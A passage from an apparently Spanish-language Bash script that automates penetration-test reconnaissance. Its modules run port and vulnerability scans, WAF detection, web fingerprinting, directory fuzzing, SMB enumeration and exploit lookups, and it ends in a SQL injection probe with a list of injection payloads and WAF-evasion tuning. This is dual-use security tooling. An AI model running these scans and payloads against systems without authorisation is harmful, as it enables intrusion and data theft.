        done <<< "${puertos_nl}"
    fi

    echo
    echo "${nmap_out}" > "${OUTPUT_DIR}/nmap/port_discovery.txt"
}

# ─── MÓDULO 3: SERVICE & VERSION ────────────────────────────────
modulo_version_scan() {
    [[ -z "$OPEN_PORTS_CSV" ]] && warn "Sin puertos para escanear. Saltando módulo 3." && return

    log "MÓDULO 3: Service & Version Fingerprinting"
    local base="${OUTPUT_DIR}/nmap/${TARGET//\//_}_version"

    local cmd="nmap -n -Pn -sV -sC -vv --min-rate 2000 -p${OPEN_PORTS_CSV} -oA ${base} ${TARGET}"
    cmd_show "$cmd"

    nmap -n -Pn -sV -sC -vv --min-rate 2000 -p"${OPEN_PORTS_CSV}" -oA "${base}" "${TARGET}" 2>/dev/null

    # Parsear servicios del XML para el reporte
    if [[ -f "${base}.xml" ]]; then
        local services
        services=$(grep -oP 'portid="\K[^"]+|name="\K[^"]+|product="\K[^"]+|version="\K[^"]+' "${base}.xml" 2>/dev/null | paste - - - - | head -20)
        [[ -n "$services" ]] && add_finding "INFO" "Servicios Detectados" "<pre>${services}</pre>"
        xsltproc "${base}.xml" -o "${base}.html" 2>/dev/null && ok "HTML: ${base}.html"

        # ── INTEL: extraer servicios y tecnologías ──
        local nmap_txt="${base}.nmap"
        if [[ -f "$nmap_txt" ]]; then
            # Detectar OS real por servicios (más preciso que TTL)
            grep -qi "microsoft\|windows\|smb\|iis" "$nmap_txt" && INTEL_OS="windows" && intel_log "OS confirmado → Windows (por servicios)"
            grep -qi "openssh\|apache\|nginx\|ubuntu\|debian\|centos" "$nmap_txt" && INTEL_OS="linux" && intel_log "OS confirmado → Linux (por servicios)"

            # Detectar tecnologías web
            grep -qi "php" "$nmap_txt"    && INTEL_TECHNOLOGIES+=("php")    && intel_log "PHP detectado"
            grep -qi "python\|flask\|django\|wsgi" "$nmap_txt" && INTEL_TECHNOLOGIES+=("python") && intel_log "Python detectado"
            grep -qi "node\|express\|npm" "$nmap_txt" && INTEL_TECHNOLOGIES+=("nodejs") && intel_log "Node.js detectado"
            grep -qi "java\|tomcat\|jboss\|spring" "$nmap_txt" && INTEL_TECHNOLOGIES+=("java") && intel_log "Java/Tomcat detectado → XXE probable en SOAP/REST XML"
            grep -qi "axis\|cxf\|metro\|soap\|wsdl" "$nmap_txt" && INTEL_TECHNOLOGIES+=("soap") && intel_log "SOAP WebService → XXE muy probable"
            grep -qi "iis" "$nmap_txt"   && INTEL_TECHNOLOGIES+=("iis")    && intel_log "IIS detectado → Windows server"
            grep -qi "apache" "$nmap_txt" && INTEL_TECHNOLOGIES+=("apache") && intel_log "Apache detectado"
            grep -qi "nginx" "$nmap_txt"  && INTEL_TECHNOLOGIES+=("nginx")  && intel_log "Nginx detectado"
            grep -qi "mysql\|mariadb" "$nmap_txt" && INTEL_TECHNOLOGIES+=("mysql") && intel_log "MySQL detectado → probar SQLi en web"
            grep -qi "postgresql" "$nmap_txt" && INTEL_TECHNOLOGIES+=("postgresql") && intel_log "PostgreSQL detectado"
            grep -qi "mongodb" "$nmap_txt" && INTEL_TECHNOLOGIES+=("mongodb") && intel_log "MongoDB detectado → posible NoSQLi"
            grep -qi "redis" "$nmap_txt"   && INTEL_TECHNOLOGIES+=("redis") && intel_log "Redis expuesto → verificar auth"
            grep -qi "elasticsearch" "$nmap_txt" && INTEL_TECHNOLOGIES+=("elasticsearch") && intel_log "Elasticsearch → posible data exposure"
            grep -qi "jenkins" "$nmap_txt" && INTEL_TECHNOLOGIES+=("jenkins") && add_finding "ALTO" "Jenkins Detectado" "Jenkins expuesto. Verifica autenticación y CVEs como CVE-2019-1003000."
            grep -qi "wordpress\|wp-" "$nmap_txt" && INTEL_CMS="wordpress" && intel_log "WordPress detectado vía nmap"

            # Guardar listado de servicios para searchsploit inteligente
            while IFS= read -r svc_line; do
                [[ -n "$svc_line" ]] && INTEL_SERVICES+=("$svc_line")
            done < <(grep -E "^[0-9]+/tcp.*open" "$nmap_txt" 2>/dev/null | head -20)

            intel_log "Servicios registrados: ${#INTEL_SERVICES[@]}"
        fi
    fi
    echo
}

# ─── MÓDULO 4: WAF DETECTION ────────────────────────────────────
modulo_waf() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v wafw00f >/dev/null 2>&1 || { warn "wafw00f no disponible. Instala: sudo apt install wafw00f"; return; }

    log "MÓDULO 4: WAF Detection"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"

    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local cmd="wafw00f ${url} -o ${OUTPUT_DIR}/web/waf_detection.txt"
    cmd_show "$cmd"

    local waf_out
    waf_out=$(wafw00f "${url}" 2>/dev/null)
    echo "${waf_out}" > "${OUTPUT_DIR}/web/waf_detection.txt"

    if echo "${waf_out}" | grep -qi "is behind"; then
        local waf_name
        waf_name=$(echo "${waf_out}" | grep -i "is behind" | head -1)
        warn "WAF DETECTADO: ${waf_name}"
        add_finding "MEDIO" "WAF Detectado" "${waf_name} — Ajusta tu estrategia de evasión."
        tip "Con WAF activo usa --scan-delay en nmap y wordlists más pequeñas en gobuster."
        # ── INTEL: WAF activo → ajustar velocidad y técnicas ──
        INTEL_WAF_DETECTED=true
        INTEL_WAF_NAME="${waf_name}"
        INTEL_SCAN_DELAY=500
        intel_log "WAF activo → módulos web usarán delay ${INTEL_SCAN_DELAY}ms y headers de evasión"
        intel_log "SQLi y XSS usarán payloads con evasión de WAF automáticamente"
    else
        ok "No se detectó WAF."
        add_finding "INFO" "WAF" "No se detectó WAF activo. El target puede ser más permisivo."
        INTEL_WAF_DETECTED=false
        INTEL_SCAN_DELAY=0
    fi
    echo
}

# ─── MÓDULO 5: HTTP HEADERS ANALYSIS ────────────────────────────
modulo_http_headers() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 5: HTTP Security Headers Analysis"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}:${port}}"

    cmd_show "curl -skI --max-time 10 ${url}"

    local headers
    headers=$(curl -skI --max-time 10 "${url}" 2>/dev/null)
    echo "${headers}" > "${OUTPUT_DIR}/web/http_headers.txt"

    if [[ -z "$headers" ]]; then
        warn "No se pudo conectar a ${url}"
        return
    fi

    echo "${headers}" | head -5
    echo

    # Analizar headers de seguridad
    local missing_headers=()
    local security_issues=""

    declare -A SEC_HEADERS=(
        ["Strict-Transport-Security"]="Previene downgrade a HTTP (HSTS)"
        ["X-Frame-Options"]="Protege contra Clickjacking"
        ["X-Content-Type-Options"]="Previene MIME sniffing"
        ["Content-Security-Policy"]="Mitiga XSS y data injection"
        ["X-XSS-Protection"]="Filtro XSS del navegador"
        ["Referrer-Policy"]="Controla información del Referer"
        ["Permissions-Policy"]="Controla acceso a APIs del navegador"
    )

    for header in "${!SEC_HEADERS[@]}"; do
        if echo "${headers}" | grep -qi "^${header}:"; then
            echo -e "  ${C_GRN}[✓]${C_RST} ${header}"
        else
            echo -e "  ${C_RED}[✗]${C_RST} ${header} ${C_DIM}→ ${SEC_HEADERS[$header]}${C_RST}"
            missing_headers+=("$header")
            security_issues+="<li><b>${header}</b>: ${SEC_HEADERS[$header]}</li>"
        fi
    done

    if [[ ${#missing_headers[@]} -gt 0 ]]; then
        add_finding "BAJO" "Security Headers Faltantes (${#missing_headers[@]})" "<ul>${security_issues}</ul>"
    fi

    # Detectar info sensible en headers
    if echo "${headers}" | grep -qi "server:"; then
        local server_header
        server_header=$(echo "${headers}" | grep -i "^server:" | head -1)
        warn "Header Server expuesto: ${server_header}"
        add_finding "BAJO" "Server Header Expuesto" "${server_header} — Revela tecnología del servidor."
    fi

    if echo "${headers}" | grep -qi "x-powered-by:"; then
        local xpb
        xpb=$(echo "${headers}" | grep -i "x-powered-by:" | head -1)
        warn "X-Powered-By expuesto: ${xpb}"
        add_finding "BAJO" "X-Powered-By Header Expuesto" "${xpb} — Revela stack tecnológico."
    fi
    echo
}

# ─── MÓDULO 6: WEB TECH FINGERPRINTING ──────────────────────────
modulo_whatweb() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v whatweb >/dev/null 2>&1 || { warn "whatweb no disponible."; return; }

    log "MÓDULO 6: Web Technology Fingerprinting (whatweb)"
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"

    cmd_show "whatweb -a 3 ${url} --log-brief=${OUTPUT_DIR}/web/whatweb.txt"

    local ww_out
    ww_out=$(whatweb -a 3 "${url}" 2>/dev/null)
    echo "${ww_out}" | tee "${OUTPUT_DIR}/web/whatweb.txt"

    if [[ -n "$ww_out" ]]; then
        add_finding "INFO" "Web Technologies (whatweb)" "<pre>${ww_out}</pre>"

        # ── INTEL: detectar CMS, frameworks y tecnologías ──
        echo "$ww_out" | grep -qi "wordpress"  && INTEL_CMS="wordpress"  && intel_log "WordPress detectado → usando wordlist WP en gobuster"
        echo "$ww_out" | grep -qi "joomla"     && INTEL_CMS="joomla"     && intel_log "Joomla detectado → usando wordlist Joomla"
        echo "$ww_out" | grep -qi "drupal"     && INTEL_CMS="drupal"     && intel_log "Drupal detectado → usando wordlist Drupal"
        echo "$ww_out" | grep -qi "magento"    && INTEL_CMS="magento"    && intel_log "Magento detectado → e-commerce, buscar credenciales admin"
        echo "$ww_out" | grep -qi "shopify"    && INTEL_CMS="shopify"    && intel_log "Shopify detectado"
        echo "$ww_out" | grep -qi "php"        && INTEL_TECHNOLOGIES+=("php")
        echo "$ww_out" | grep -qi "laravel"    && INTEL_TECHNOLOGIES+=("laravel") && intel_log "Laravel detectado → buscar .env, debug mode"
        # ── Frontend frameworks ──
        echo "$ww_out" | grep -qi "next.js\|nextjs\|_next"   && INTEL_FRAMEWORK_JS="nextjs"   && intel_log "Next.js → rutas /_next/, /api/, SSR"
        echo "$ww_out" | grep -qi "nuxt"                        && INTEL_FRAMEWORK_JS="nuxt"     && intel_log "Nuxt.js → rutas /_nuxt/, /api/"
        echo "$ww_out" | grep -qi "gatsby\|___gatsby"          && INTEL_FRAMEWORK_JS="gatsby"   && intel_log "Gatsby → rutas estáticas + /page-data/"
        echo "$ww_out" | grep -qi "astro\|_astro"              && INTEL_FRAMEWORK_JS="astro"    && intel_log "Astro → /dist/, SSR endpoints"
        echo "$ww_out" | grep -qi "svelte\|__svelte\|kit"     && INTEL_FRAMEWORK_JS="svelte"   && intel_log "SvelteKit → /.svelte-kit/, /api/"
        echo "$ww_out" | grep -qi "remix"                       && INTEL_FRAMEWORK_JS="remix"    && intel_log "Remix → /build/, loader endpoints"
        echo "$ww_out" | grep -qi "react\|data-reactroot"      && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="react" && intel_log "React detectado"
        echo "$ww_out" | grep -qi "angular\|ng-version"        && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="angular" && intel_log "Angular detectado"
        echo "$ww_out" | grep -qi "vue\|__vue"                 && [[ -z "$INTEL_FRAMEWORK_JS" ]] && INTEL_FRAMEWORK_JS="vue" && intel_log "Vue.js detectado"
        echo "$ww_out" | grep -qi "vite\|@vite"               && INTEL_TECHNOLOGIES+=("vite")  && intel_log "Vite detectado → buscar sourcemaps"
        echo "$ww_out" | grep -qi "jquery"     && INTEL_TECHNOLOGIES+=("jquery")
        echo "$ww_out" | grep -qi "bootstrap"  && INTEL_TECHNOLOGIES+=("bootstrap")
        # ── Backend frameworks ──
        echo "$ww_out" | grep -qi "x-powered-by.*asp\|asp.net\|aspnet" && INTEL_FRAMEWORK_BACKEND="aspnet"    && INTEL_TECHNOLOGIES+=("aspnet") && intel_log "ASP.NET → ViewState, trace.axd, YSOSERIAL"
        echo "$ww_out" | grep -qi "\.net core\|dotnet\|kestrel"        && INTEL_FRAMEWORK_BACKEND="dotnetcore" && INTEL_TECHNOLOGIES+=("dotnetcore") && intel_log ".NET Core → /swagger, /healthz, /metrics"
        echo "$ww_out" | grep -qi "django"                                 && INTEL_FRAMEWORK_BACKEND="django"    && intel_log "Django → /admin, debug toolbar, SSTI Jinja2"
        echo "$ww_out" | grep -qi "fastapi\|uvicorn"                      && INTEL_FRAMEWORK_BACKEND="fastapi"   && intel_log "FastAPI → /docs, /redoc, /openapi.json (auto-expuesto!)"
        echo "$ww_out" | grep -qi "flask\|werkzeug"                       && INTEL_FRAMEWORK_BACKEND="flask"     && intel_log "Flask → SSTI Jinja2, /console si debug activo"
        echo "$ww_out" | grep -qi "ruby.on.rails\|x-powered-by.*phusion"  && INTEL_FRAMEWORK_BACKEND="rails"    && intel_log "Rails → /rails/info, SSTI ERB"
        echo "$ww_out" | grep -qi "symfony"                                 && INTEL_FRAMEWORK_BACKEND="symfony"   && intel_log "Symfony → /_profiler, debug toolbar"
        echo "$ww_out" | grep -qi "nestjs\|nest.js"                        && INTEL_FRAMEWORK_BACKEND="nestjs"   && intel_log "NestJS → Swagger auto /api, /api-json"
        echo "$ww_out" | grep -qi "express\|x-powered-by.*express"         && INTEL_FRAMEWORK_BACKEND="express"  && intel_log "Express.js → /api/, prototype pollution"
        # ── Cloud providers ──
        echo "$ww_out" | grep -qi "cloudfront\|amazon\|aws"  && INTEL_CLOUD_PROVIDER="aws"        && intel_log "AWS/CloudFront → buscar IP real y S3 buckets"
        echo "$ww_out" | grep -qi "cloudflare"                  && INTEL_CLOUD_PROVIDER="cloudflare" && INTEL_BEHIND_CDN=true && intel_log "Cloudflare → intentar bypass IP real"
        echo "$ww_out" | grep -qi "azure\|microsoft.azure"     && INTEL_CLOUD_PROVIDER="azure"      && intel_log "Azure → buscar Storage Blobs públicos"
        echo "$ww_out" | grep -qi "vercel\|now\.sh"           && INTEL_CLOUD_PROVIDER="vercel"     && intel_log "Vercel → buscar .env en build output"
        echo "$ww_out" | grep -qi "netlify"                     && INTEL_CLOUD_PROVIDER="netlify"    && intel_log "Netlify → buscar _redirects, netlify.toml"
        # ── Construir rutas específicas del framework detectado ──
        _build_framework_routes

        # Elegir wordlist según CMS detectado
        case "$INTEL_CMS" in
            wordpress)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt" &&                     intel_log "Wordlist WordPress activada para gobuster"
                add_finding "ALTO" "WordPress Detectado" "Ejecutar: <code>wpscan --url ${url} --enumerate u,p,t --api-token TU_TOKEN</code>"
                ;;
            joomla)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/joomla.txt" &&                     intel_log "Wordlist Joomla activada"
                add_finding "ALTO" "Joomla Detectado" "Ejecutar: <code>joomscan --url ${url}</code>"
                ;;
            drupal)
                [[ -f "/usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt" ]] &&                     INTEL_WORDLIST_EXTRA="/usr/share/seclists/Discovery/Web-Content/CMS/drupal.txt"
                add_finding "ALTO" "Drupal Detectado" "Ejecutar: <code>droopescan scan drupal -u ${url}</code>"
                ;;
        esac

        [[ -n "$INTEL_CMS" ]] && intel_log "CMS: ${INTEL_CMS} — gobuster y SQLi usarán rutas específicas"
    fi
    echo
}

# ─── MÓDULO 7: NIKTO SCAN ───────────────────────────────────────
modulo_nikto() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v nikto >/dev/null 2>&1 || { warn "nikto no disponible."; return; }

    log "MÓDULO 7: Nikto Web Vulnerability Scanner"
    tip "Nikto es ruidoso. En Bug Bounty verifica que esté permitido en el scope."

    local port="${WEB_PORTS[0]}"
    local output_file="${OUTPUT_DIR}/web/nikto_${port}.txt"

    cmd_show "nikto -host ${TARGET} -port ${port} -output ${output_file} -Format txt"

    nikto -host "${TARGET}" -port "${port}" -output "${output_file}" -Format txt 2>/dev/null | tee /tmp/nikto_live.txt

    if [[ -f "$output_file" ]]; then
        local vulns
        vulns=$(grep -c "OSVDB\|CVE\|+ " "$output_file" 2>/dev/null || echo "0")
        ok "Nikto completado. Hallazgos potenciales: ${vulns}"

        local nikto_findings
        nikto_findings=$(grep "^+" "$output_file" | head -20)
        [[ -n "$nikto_findings" ]] && add_finding "MEDIO" "Nikto Web Findings" "<pre>${nikto_findings}</pre>"
    fi
    echo
}

# ─── MÓDULO 8: DIRECTORY FUZZING ────────────────────────────────
modulo_gobuster() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v gobuster >/dev/null 2>&1 || { warn "gobuster no disponible. Instala: sudo apt install gobuster"; return; }

    log "MÓDULO 8: Directory & File Fuzzing (gobuster)"

    # ── INTEL READ: ajustar según lo descubierto ──
    # Wordlist base
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    [[ -f "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" ]] && \
        wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

    # Si whatweb detectó un CMS, usar su wordlist específica
    if [[ -n "$INTEL_WORDLIST_EXTRA" && -f "$INTEL_WORDLIST_EXTRA" ]]; then
        wordlist="$INTEL_WORDLIST_EXTRA"
        intel_log "Usando wordlist específica de ${INTEL_CMS}: ${wordlist}"
    fi

    if [[ ! -f "$wordlist" ]]; then
        warn "Wordlist no encontrada. Instala: sudo apt install seclists dirb"
        return
    fi

    # Ajustar threads según WAF
    local threads=30
    if [[ "$INTEL_WAF_DETECTED" == "true" ]]; then
        threads=5
        intel_log "WAF detectado → reduciendo threads a ${threads} para evasión"
    fi

    # Extensiones según tecnología detectada
    local extensions="php,html,txt,bak,old,zip,js,json,config,xml"
    if [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet " ]]; then
        extensions="asp,aspx,config,bak,txt,xml"
        intel_log "ASP.NET detectado → usando extensiones: ${extensions}"
    elif [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " python " ]]; then
        extensions="py,txt,bak,zip,json,cfg,conf"
        intel_log "Python detectado → usando extensiones: ${extensions}"
    elif [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " nodejs " ]]; then
        extensions="js,json,txt,bak,env,config"
        intel_log "Node.js detectado → buscando .env y configs JS"
    fi

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}:${port}}"
    local output_file="${OUTPUT_DIR}/web/gobuster_${port}.txt"

    cmd_show "gobuster dir -u ${url} -w ${wordlist} -t ${threads} -x ${extensions} -o ${output_file} -q"

    gobuster dir -u "${url}" \
        -w "${wordlist}" \
        -t "${threads}" \
        -x "${extensions}" \
        -o "${output_file}" \
        -q \
        --no-error 2>/dev/null | tee /tmp/gobuster_live.txt

    if [[ -f "$output_file" ]]; then
        local found
        found=$(grep -c "Status:" "$output_file" 2>/dev/null || echo "0")
        ok "Rutas encontradas: ${found}"

        # Destacar hallazgos interesantes
        local interesting
        interesting=$(grep -E "Status: (200|301|302|401|403)" "$output_file" | head -30)
        [[ -n "$interesting" ]] && add_finding "MEDIO" "Directorios/Archivos Encontrados (${found})" "<pre>${interesting}</pre>"

        # Alertar sobre archivos sensibles
        local sensitive
        sensitive=$(grep -iE "(backup|\.bak|\.old|\.zip|admin|config|\.env|passwd|shadow|\.git)" "$output_file" 2>/dev/null)
        [[ -n "$sensitive" ]] && add_finding "ALTO" "Archivos Sensibles Potenciales" "<pre>${sensitive}</pre>"

        # ── INTEL WRITE: guardar rutas sensibles para otros módulos ──
        while IFS= read -r path_line; do
            local clean_path
            clean_path=$(echo "$path_line" | grep -oE "^/[^ ]+" | head -1)
            [[ -n "$clean_path" ]] && INTEL_SENSITIVE_PATHS+=("${url}${clean_path}")
        done < <(grep -iE "admin|api|config|login|dashboard|panel|debug" "$output_file" 2>/dev/null | head -20)

        # URLs con parámetros para SQLi/XSS
        while IFS= read -r url_line; do
            INTEL_INJECTABLE_URLS+=("${url_line}")
        done < <(grep -E "Status: 200" "$output_file" | grep -E "\.php|\.asp" | grep -oE "^/[^ ]+" | sed "s|^|${url}|" | head -10)

        intel_log "Rutas sensibles registradas para SQLi/XSS: ${#INTEL_INJECTABLE_URLS[@]}"
        # IDOR: detectar rutas con IDs numéricos
        while IFS= read -r idor_path; do
            [[ "$idor_path" =~ [0-9]+$ || "$idor_path" =~ id|user|order|account ]] &&                 INTEL_INJECTABLE_URLS+=("${url}${idor_path}")
        done < <(grep -E "Status: 200" "$output_file" | grep -oE "^/[a-zA-Z0-9/_-]+" | head -10)
    fi
    echo
}

# ─── MÓDULO 9: SUBDOMAIN ENUMERATION ────────────────────────────
modulo_subdominios() {
    is_domain "$TARGET" || { log "Target es IP. Saltando enumeración de subdominios."; return; }
    command -v subfinder >/dev/null 2>&1 || { warn "subfinder no disponible. Instala: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"; return; }

    log "MÓDULO 9: Subdomain Enumeration (subfinder)"
    local output_file="${OUTPUT_DIR}/recon/subdominios.txt"

    cmd_show "subfinder -d ${TARGET} -o ${output_file} -all -silent"

    subfinder -d "${TARGET}" -o "${output_file}" -all -silent 2>/dev/null

    if [[ -f "$output_file" ]]; then
        local count
        count=$(wc -l < "$output_file")
        ok "Subdominios encontrados: ${count}"
        head -20 "$output_file"
        add_finding "INFO" "Subdominios Encontrados (${count})" "<pre>$(cat "${output_file}")</pre>"
    fi
    echo
}

# ─── MÓDULO 10: SMB ENUMERATION ─────────────────────────────────
modulo_smb() {
    echo "$OPEN_PORTS_CSV" | grep -qE "(445|139)" || return
    command -v enum4linux-ng >/dev/null 2>&1 || { warn "enum4linux-ng no disponible. Instala: sudo apt install enum4linux-ng"; return; }

    log "MÓDULO 10: SMB Enumeration (enum4linux-ng)"
    tip "SMB suele tener misconfigs críticas: shares abiertos, RID brute, null sessions."

    local output_file="${OUTPUT_DIR}/recon/smb_enum.txt"
    cmd_show "enum4linux-ng -A ${TARGET} -oA ${OUTPUT_DIR}/recon/smb"

    enum4linux-ng -A "${TARGET}" -oA "${OUTPUT_DIR}/recon/smb" 2>/dev/null | tee "${output_file}"

    if [[ -f "$output_file" ]]; then
        local shares
        shares=$(grep -i "share\|disk\|IPC" "$output_file" | head -10)
        [[ -n "$shares" ]] && add_finding "ALTO" "SMB Shares Detectados" "<pre>${shares}</pre>"
    fi
    echo
}

# ─── MÓDULO 11: VULNERABILITY SCAN ──────────────────────────────
modulo_vuln_scan() {
    [[ -z "$OPEN_PORTS_CSV" ]] && return

    log "MÓDULO 11: Vulnerability Scan (nmap vuln scripts)"
    tip "Este módulo puede tardar varios minutos. Ideal ejecutar en CTF y entornos controlados."

    local base="${OUTPUT_DIR}/nmap/${TARGET//\//_}_vulns"
    cmd_show "nmap -n -Pn --min-rate 2000 -vv --script vuln -p${OPEN_PORTS_CSV} -oA ${base} ${TARGET}"

    nmap -n -Pn --min-rate 2000 -vv --script vuln \
        -p"${OPEN_PORTS_CSV}" \
        -oA "${base}" \
        "${TARGET}" 2>/dev/null

    if [[ -f "${base}.xml" ]]; then
        xsltproc "${base}.xml" -o "${base}.html" 2>/dev/null && ok "HTML: ${base}.html"

        # Extraer CVEs encontrados
        local cves
        cves=$(grep -oP 'CVE-[0-9]{4}-[0-9]+' "${base}.nmap" 2>/dev/null | sort -u)
        if [[ -n "$cves" ]]; then
            warn "CVEs potenciales detectados:"
            echo "${cves}"
            add_finding "CRÍTICO" "CVEs Detectados por Nmap" "<pre>${cves}</pre>"
        fi
    fi
    echo
}

# ─── MÓDULO 12: SEARCHSPLOIT ────────────────────────────────────
modulo_searchsploit() {
    command -v searchsploit >/dev/null 2>&1 || { warn "searchsploit no disponible."; return; }
    [[ -f "${OUTPUT_DIR}/nmap/${TARGET//\//_}_version.nmap" ]] || return

    log "MÓDULO 12: Exploit Search (searchsploit)"
    tip "Busca exploits para los servicios detectados en el escaneo de versiones."

    local version_file="${OUTPUT_DIR}/nmap/${TARGET//\//_}_version.nmap"
    local output_file="${OUTPUT_DIR}/exploits/searchsploit_results.txt"

    cmd_show "searchsploit --nmap ${version_file} -t"

    searchsploit --nmap "${version_file}" 2>/dev/null | tee "${output_file}"

    if [[ -s "$output_file" ]]; then
        local exploit_count
        exploit_count=$(grep -c "Exploit Title" "$output_file" 2>/dev/null || echo "1")
        add_finding "ALTO" "Exploits Públicos Encontrados (searchsploit)" "<pre>$(head -40 "${output_file}")</pre>"

        # ── INTEL READ+WRITE: búsquedas extra según tecnologías detectadas ──
        if [[ ${#INTEL_TECHNOLOGIES[@]} -gt 0 ]]; then
            intel_log "Buscando exploits adicionales para: ${INTEL_TECHNOLOGIES[*]}"
            local extra_file="${OUTPUT_DIR}/exploits/searchsploit_extra.txt"
            for tech in "${INTEL_TECHNOLOGIES[@]}"; do
                echo "=== ${tech} ===" >> "$extra_file"
                searchsploit "$tech" 2>/dev/null | grep -iE "rce|exec|inject|upload|auth bypass|lfi|rfi|sqli" | head -10 >> "$extra_file"
            done
            if [[ -s "$extra_file" ]]; then
                add_finding "ALTO" "Exploits por Tecnología Detectada (${INTEL_TECHNOLOGIES[*]})" "<pre>$(head -50 "${extra_file}")</pre>"
            fi
        fi

        # Si SQLi fue encontrado, buscar exploits de la BD
        if [[ "$INTEL_SQLI_FOUND" == "true" ]]; then
            intel_log "SQLi confirmado → buscando exploits de escalada via ${db_type:-sql}"
        fi
    fi
    echo
}

# ─── MÓDULO 13: SQL INJECTION BÁSICO ────────────────────────────
modulo_sqli() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando SQLi." && return

    log "MÓDULO 13: SQL Injection — Pruebas Básicas (curl)"
    tip "Se prueban payloads básicos en parámetros GET. No reemplaza sqlmap, pero da señales rápidas."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local output_file="${OUTPUT_DIR}/web/sqli_results.txt"
    local vuln_count=0
    local findings_detail=""

    # ── INTEL READ: adaptar SQLi según contexto ──
    if [[ "$INTEL_WAF_DETECTED" == "true" ]]; then
        intel_log "WAF detectado (${INTEL_WAF_NAME}) → añadiendo payloads con evasión WAF"
        tip "WAF activo: se usan payloads con comentarios SQL, case mixing y codificación"
    fi

    # Si gobuster encontró rutas con PHP/ASP, agregarlas como targets
    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        intel_log "Usando ${#INTEL_INJECTABLE_URLS[@]} URLs encontradas por gobuster como targets adicionales"
    fi

    # Si MySQL detectado por nmap, priorizar payloads MySQL
    local db_type="generic"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mysql " ]]      && db_type="mysql"      && intel_log "MySQL confirmado → priorizando payloads MySQL/MariaDB"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " postgresql " ]] && db_type="postgresql" && intel_log "PostgreSQL confirmado → usando payloads PG"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet " ]]     && db_type="mssql"      && intel_log "ASP.NET → posible MSSQL, usando payloads MSSQL"

    # Payloads base + evasión WAF si aplica
    local PAYLOADS=(
        "'"
        "'--"
        "' OR '1'='1"
        "' OR 1=1--"
        "\" OR \"1\"=\"1"
        "1' ORDER BY 1--"
        "1' ORDER BY 999--"
        "' AND SLEEP(2)--"
        "1; SELECT SLEEP(2)--"
        "' AND 1=CONVERT(int,@@version)--"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "admin'--"
        "' OR 'x'='x"
    )

    # Errores típicos de BD que indican SQLi
    local DB_ERRORS=(
        "you have an error in your sql"
        "warning: mysql"
        "unclosed quotation mark"
        "quoted string not properly terminated"
        "odbc sql server driver"
        "microsoft ole db provider"
        "ora-01756"
        "sqlite_error"
        "pg_query"
        "postgresql.*error"
        "syntax error.*sql"
        "microsoft jet database"
        "division by zero"
    )

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo -e "  Payloads: ${#PAYLOADS[@]} | Errores monitoreados: ${#DB_ERRORS[@]}"
    echo

    # Buscar parámetros GET en la página principal
    local page_links
    page_links=$(curl -skL --max-time 10 "${base_url}" 2>/dev/null | \
        grep -oE '(href|action|src)="[^"]*\?[^"]*"' | \
        grep -oE '"[^"]*\?[^"]*"' | tr -d '"' | \
        sed "s|^/|${base_url}/|g" | head -15)

    if [[ -z "$page_links" ]]; then
        # Si no hay links con params, probar rutas comunes con id=1
        page_links=$(printf "%s\n%s\n%s\n%s\n%s"             "${base_url}/?id=1"             "${base_url}/index.php?id=1"             "${base_url}/search?q=test"             "${base_url}/product?id=1"             "${base_url}/page?id=1")
        warn "No se encontraron parámetros GET en la página. Probando rutas genéricas."
    fi

    echo "${page_links}" | while IFS= read -r url_param; do
        [[ -z "$url_param" ]] && continue
        # Extraer la parte base y el parámetro
        local base_param
        base_param=$(echo "$url_param" | cut -d'?' -f1)
        local params
        params=$(echo "$url_param" | cut -d'?' -f2)

        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${url_param}${C_RST}"

        # Agregar payloads custom del usuario (--update los carga)
        local ALL_PAYLOADS=("${PAYLOADS[@]}" "${INTEL_EXTRA_PAYLOADS_SQLI[@]}")
